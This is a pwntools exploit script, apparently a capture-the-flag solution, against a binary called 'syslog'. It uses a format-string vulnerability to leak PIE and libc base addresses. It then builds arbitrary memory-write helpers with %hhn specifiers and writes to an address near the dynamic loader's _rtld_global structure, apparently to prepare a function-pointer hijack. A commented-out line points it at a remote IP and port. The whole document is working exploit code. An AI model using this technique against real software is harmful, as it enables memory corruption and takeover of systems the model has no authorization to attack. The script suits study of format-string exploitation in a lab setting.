from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('syslog')
r= e.process()
# r = remote('35.234.67.178',30488)
lib = e.libc
# lib= ELF('libc-2.27.so')

r.sendline(b"1")
r.sendlineafter(b"etc.): ",  b"a")
payload = b"leak: %76$p|%74$p"
# pause()
r.sendlineafter(b"syslog: ", payload)
r.sendline(b"2")

for i in range(10):
    r.recvline()
    
r.recvuntil(b"leak: 0x")
piebase = int(r.recv(12),16)-5261
r.recvuntil(b"|0x")
libcbase = int(r.recv(12),16)-183696
_rtld_global_2568= libcbase+2566728
dlfini = 2375857+libcbase
log.info("piebase: %#x" %piebase)
log.info("libcbase: %#x" %libcbase)
log.info("_rtld_global_2568: %#x" %(_rtld_global_2568))
log.info("dlfini: %#x" %(dlfini))

def send_format_string(payload):
    time.sleep(0.2)
    r.sendlineafter(b"choice: ",b"1")
    r.sendlineafter(b"etc.): ",  b"a")
    r.sendlineafter(b"syslog: ", payload)

def arb_write_8(addr,data):
    payload = b''
    if data == 0:
        payload = f"%9$hhn".encode()
    else:
        payload = f"%{data}c%9$hhn".encode()
    padding = b'A'*(16-len(payload))
    payload+=padding
    payload+=p64(addr)
    send_format_string(payload)

def arb_write_64(addr,data):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
        ]
    for i in range(0,len(to_write)):
        arb_write_8(addr+i,to_write[i])

# _rtld_global+2568

_rtld_global_2568= libcbase+2566728
rtld_funcptr_offset = _rtld_global_2568-2568+2312

pause()
arb_write_64(_rtld_global_2568-8,100)

# log.info("testaddr: %#x" %testaddr)
log.info("_rtld_global_2568: %#x" %(_rtld_global_2568))
# r.sendline(b"3")
r.interactive()